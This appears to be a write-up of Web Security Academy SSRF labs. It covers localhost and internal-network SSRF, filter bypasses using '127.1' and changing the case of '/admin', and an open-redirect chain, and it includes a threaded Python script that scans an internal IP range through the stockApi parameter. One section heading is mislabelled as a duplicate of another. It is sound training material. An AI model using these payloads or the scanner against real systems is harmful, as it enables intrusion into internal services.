# Server Side Request Forgery 

<h3> Lab: Basic SSRF against the local server </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/32997785-74fe-46ec-a190-4075db32ec9c)

After going over to the web page i see this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3cd6f9f7-7910-48bc-9d12-a47ac10ad906)

Checking a random product shows this stock get function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6cc8f8b0-d8cd-49de-839c-b42962b14a67)

Intercepting the request and clicking it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2f4f356c-2839-4157-946c-f23483913339)

It is loading the stock value from an external url 

Since the aim of this challenge is to delete the user *carlos* on the */admin* directory from the internal web app let us do that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b1d984ff-4d0e-4f13-ba52-942d409a7fa5)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb603606-d8cf-4ee7-aeb0-f6b876f84a2b)

The path to delete it is */admin/delete?username=carlos*

Doing that works and we get challenge solved
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c5a88ce6-d848-4046-9adb-c1477d55340c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9b984c07-8bae-4a36-adc3-4098a16b121a)


<h3> Lab: Basic SSRF against another back-end system </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d4db110-6343-48b3-94c3-3a3a35a3cb0e)

Going over to the web app shows still the same function as the previous one
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb7a87f4-8032-4308-aa57-e3032ff91635)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09c8cf2d-78c5-46e5-8c88-bf5162563c83)

The aim for this challenge is to scan the internal *192.168.0.X* range for an admin interface on port *8080*, then use it to delete the user carlos

I didn't want to use burp intruder for it so i made a script for it

```python
#!/usr/bin/python3
import requests
from time import sleep
from threading import Thread

def sendRequest(url, cookie, ip):
    # Exclude ip 192.168.0.1, which is the stock API address
    if ip == '192.168.0.1':
        return

    data = {
        'stockApi': f'http://{ip}:8080/'
    }

    # Send a POST request to /product/stock, and the data is the SSRF payload
    StatusCode = requests.post(url, cookies=cookie, data=data).status_code

    # Using \r to clean previous line
    print(f'[*] Trying ip: {ip}', end='\r')

    if StatusCode != 500:
        print(f'[+] Found a valid internal ip address: {ip}')

def main():
    url = 'https://0aa60010032c1eab80b7a35b002b000e.web-security-academy.net/product/stock'
    cookie = {'session': 'OS7X5KkySnlT6ocIvQfQuvWPt10SKciB'}

    # Generate a list of IPv4 private ip addresses from 192.168.0.0 to 192.168.0.255
    ipAddressList = list()

    for lastOctet in range(256):
        ipAddressList.append(f'192.168.0.{lastOctet}')

    # For each private ip address, spawn a new thread to function sendRequest(url, cookie, ip)
    for ip in ipAddressList:
        thread = Thread(target=sendRequest, args=(url, cookie, ip))
        thread.start()

        sleep(0.1)


if __name__ == '__main__':
    main()

```

Running it gives the ip 

```
➜  Desktop python3 solve.py
[+] Found a valid internal ip address: 192.168.0.48
➜  Desktop 
```

Trying it over my proxy gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8611e4a3-100e-4f61-86bd-aa343896efcf)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2cf4a98a-590d-46d3-aa80-37599f54db87)

We can now delete the user *carlos*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26b903b0-163f-4513-be3f-7ee33256f6f7)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/23acecf1-27da-42ef-9b37-76f3803c2be9)

<h3> Lab: SSRF with blacklist-based input filter </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/486edb3d-bc92-48e8-b78d-d526adb663de)

Moving over to the web app shows the normal function we've been seeing
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53f9dcf8-beeb-4cc1-b70e-cd683703291b)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/555f291f-8e18-4542-bb81-3dbca2f9a461)

But when I tried accessing localhost in the stockApi variable I get an error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/953fd872-21d7-47e8-bb38-5093f103f3f6)

<h3> Lab: SSRF with filter bypass via open redirection vulnerability </h3>

So we need to bypass this

I decided to try each value of what we are trying to access individually
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5452ceec-c07f-401a-aa56-67a579a4fc5b)

Trying : `http://127.1` gives `200` Ok
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c5e739a0-5c76-4e50-93c7-57bd261901c9)

But appending /admin gives an error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b29c541-7bf5-460c-816c-7ac8e3624072)

One thing we can try here is case changing any letter of */admin* to uppercase as the web server might treat it as normal word

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e161ad0e-51fe-45b4-80f1-149a42aed2f1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/739bfefe-9db6-418c-8215-a6b51ef65fd7)

Now we can delete the user carlos account
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5317f144-dd12-47ac-be38-588d0e357ae6)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cb5cda62-d6fc-402a-b20b-61ccadfe486e)


<h3> Lab: SSRF with filter bypass via open redirection vulnerability </h3>
 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8f0c3f4-0595-4ff1-a7b5-4b95fbe90549)

Going over the web page as usual shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/08397187-b5b2-47b5-afeb-6e6160ec7377)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b302250-5016-4480-84b4-230b938b33b8)

But when i clock on the Stock button i don't see any variable that is querying a url from an external / internal source
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3c7596a-d80e-4405-a2ec-5320dfae038b)

So no ssrf here but notice the path:

```
/product/stock/check?productId=1&storeId=1
```

But looking below shows a button that can either return to list or go to next product
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6e4efeef-4ada-4062-9a66-adf15a77c08a)
 
 Clicking the next product button while intercepting the request shows this
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/655f87a8-3a19-48ef-b4b1-3fb55b3d0ac8)

The path looks interesting:

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2
```

I'll send it over to repeater to play with the parameter

But i noticed that when i forward the request it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/059419d3-b900-4b67-9ede-c07c3fdd8faf)

So that means we have an open redirect since this current parameter is called from the previous one

With this we can modify the path value to call an internal source which is this `http://192.168.0.12:8080/admin/delete?username=carlos` on the view stock request
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00115dfe-ecac-4411-ada1-eeebd5ceff15)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4f51be2-880c-4e08-89ee-206024bd1395)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac21d5f2-66f3-4252-b803-3a03beb19744)
